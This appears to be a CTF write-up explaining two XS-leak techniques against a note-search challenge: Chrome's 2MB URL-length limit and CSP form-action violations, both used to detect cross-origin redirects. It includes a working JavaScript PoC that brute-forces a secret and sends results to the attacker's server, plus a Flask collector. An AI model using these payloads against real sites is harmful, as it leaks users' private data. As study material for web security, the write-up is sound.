---
description: XS leak through cross-origin redirects — intended and unintended
---

# secrets

## Overview

> A secure and secret note storage system is a platform or application designed to keep your confidential notes safe from unauthorized access.

The challenge revolved around searching contents of secret notes.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.46.57 PM.png" alt=""><figcaption></figcaption></figure>

Let's examine the behaviour of the search feature.

When searching for a note through `/search?query=<query>`, there are two possible responses:

1. The note was found.

In this case, a 301 redirect is issued to `http://results.wtl.pw/results?ids=<note UUIDs>&query=<query>`.

```http
HTTP/1.1 301 MOVED PERMANENTLY
Server: nginx/1.23.3
Date: Sun, 19 Feb 2023 13:48:10 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 357
Connection: close
Location: http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&query=test
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&amp;query=test">http://results.wtl.pw/results?ids=92a05671-8e1a-468e-9b7f-c52789e77d4e&amp;query=test</a>. If not, click the link.
```

It is important to note that this is a redirect to a _different_ subdomain. Searching on **`secrets`**`.wtl.pw` redirects to **`results`**`.wtl.pw`.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.52.17 PM.png" alt=""><figcaption></figcaption></figure>

2. The note was not found.

In this case, a 301 redirect is issued to `http://secrets.wtl.pw/#<query>`.

```http
HTTP/1.1 301 MOVED PERMANENTLY
Server: nginx/1.23.3
Date: Sun, 19 Feb 2023 13:51:05 GMT
Content-Type: text/html; charset=utf-8
Content-Length: 241
Connection: close
Location: http://secrets.wtl.pw/#asdf
Vary: Cookie

<!doctype html>
<html lang=en>
<title>Redirecting...</title>
<h1>Redirecting...</h1>
<p>You should be redirected automatically to the target URL: <a href="http://secrets.wtl.pw/#asdf">http://secrets.wtl.pw/#asdf</a>. If not, click the link.

```

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 9.51.58 PM.png" alt=""><figcaption></figcaption></figure>

## Unintended Solution — Chrome's 2MB URL Limit

One thing that might be immediately noticeable is that if the note was found, then the resulting URL length is extended considerably by the `ids` parameter.

A [well-known technique](https://xsleaks.dev/docs/attacks/navigations/#inflation) in these kinds of scenarios is hitting the server's maximum URL limit, and detecting error status codes. However, these rely on `SameSite=None` cookies for the [error event detection](https://xsleaks.dev/docs/attacks/error-events/).&#x20;

The challenge had `SameSite=Lax` cookies, so the primitive for any XS-Leak attack is a top-level navigation (e.g. through `window.open`). There is no way to detect server response codes in a cross-origin window reference, so I started looking for other ways to detect the URL inflation.

We might not be able to detect a _server-side_ URL length error, but can we somehow detect a _client-side_ one? According to [Chromium documentation](https://chromium.googlesource.com/chromium/src/+/main/docs/security/url\_display\_guidelines/url\_display\_guidelines.md#URL-Length), Chrome's maximum URL length is 2MB.

> In general, the _web platform_ does not have limits on the length of URLs (although 2^31 is a common limit). _Chrome_ limits URLs to a maximum length of **2MB** for practical reasons and to avoid causing denial-of-service problems in inter-process communication.

This is where it gets interesting! Because this is a _client-side_ constraint, and URL fragments persist on redirects, we can open `/search?query=<query>#AAA...[2MB]...AAA` to hit the length limit.

So, what happens when the URL limit is exceeded?

Apparently, it shows an `about:blank#blocked` page.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.38.58 PM.png" alt=""><figcaption></figcaption></figure>

As you might expect, trying to access the `origin` (or any other sensitive information) of a cross-origin window reference would raise an exception.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.43.00 PM.png" alt=""><figcaption></figcaption></figure>

However, when opening a page that errors out due to the 2MB constraint, the window's `origin` remains that of the parent.

As an experiment, let's try a successful query.

```javascript
let url = "http://secrets.wtl.pw/search?query=test#"
let w = window.open(url + "A".repeat(2 * 1024 * 1024 - url.length - 1))
```

The length of the opened URL&#x20;

```
http://secrets.wtl.pw/search?query=test#AAA...AAA
```

is exactly 2MB - 1, so the initial search URL is just under the length limit.

When the window is redirected to

```
http://results.wtl.pw/results?ids=<note UUIDs>&query=test#AAA...AAA
```

the URL is extended and the length limit is hit. The window becomes an `about:blank` page and its `origin` remains that of the parent.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.54.16 PM.png" alt=""><figcaption></figcaption></figure>

Now, if we try the same thing on an unsuccessful query, the final redirected URL falls short of the 2MB limit and the window's `origin` is no longer accessible.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 10.54.42 PM.png" alt=""><figcaption></figcaption></figure>

This can be extended to the following PoC, which brute-forces a character of the flag.

```markup
<html>
<body></body>
<script>
    (async () => {

        const curr = "http://secrets.wtl.pw/search?query=HackTM{"

        const leak = async (char) => {
            
            fetch("/?try=" + char)
            let w = window.open(curr + char +  "#" + "A".repeat(2 * 1024 * 1024 - curr.length - 2))
            
            const check = async () => {
                try {
                    w.origin
                } catch {
                    fetch("/?nope=" + char)
                    return
                }
                setTimeout(check, 100)
            }
            check()
        }

        const CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"

        for (let i = 0; i < CHARSET.length; i++) {
            leak(CHARSET[i])
            await new Promise(resolve => setTimeout(resolve, 50))
        }
    })()
</script>
</html>
```

Because this PoC only tells us what is definitely _not_ the flag (by detecting the `w.origin` errors), we can implement a backend server to quickly find what _is_ the flag by eliminating the unsuccessful queries from the charset.

```python
from flask import Flask, request

app = Flask(__name__)

CHARSET = "abcdefghijklmnopqrstuvwxyz-_0123456789"
chars = []

@app.route('/', methods=['GET'])
def index():
    global chars
    
    nope = request.args.get('nope', '')
    if nope:
        chars.append(nope)

    remaining = [c for c in CHARSET if c not in chars]

    print("Remaining: {}".format(remaining))

    return "OK"

@app.route('/exploit.html', methods=['GET'])
def exploit():
    return open('exploit.html', 'r').read()

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=1337)
```

The downside of this method is that the long URLs can cause significant lag on the server's admin bot. This _may or may not_ have made the bot extremely unstable for a period of time... oops!

## Intended Solution — CSP Violation

It turns out that there is a much faster and less laggy way of detecting the redirects. Because the redirect is to a different origin, we can use [CSP violations](https://xsleaks.dev/docs/attacks/navigations/#cross-origin-redirects) as an oracle.&#x20;

```markup
<meta http-equiv="Content-Security-Policy" content="form-action http://secrets.wtl.pw">
<form action="http://secrets.wtl.pw/search" method="get">
    <input type="text" name="query" value="test">
</form>

<script>
    document.addEventListener('securitypolicyviolation', () => {
        console.log("CSP violation!")
    });
    document.forms[0].submit();
</script>
```

Because the query was successful, the window attempted to load `http://results.wtl.pw`. But since our CSP dictates that forms can only be submitted to `http://secrets.wtl.pw`, the request was blocked. We can detect this through the `securitypolicyviolation` event listener.

<figure><img src="../../.gitbook/assets/Screenshot 2023-02-19 at 11.03.59 PM.png" alt=""><figcaption></figcaption></figure>
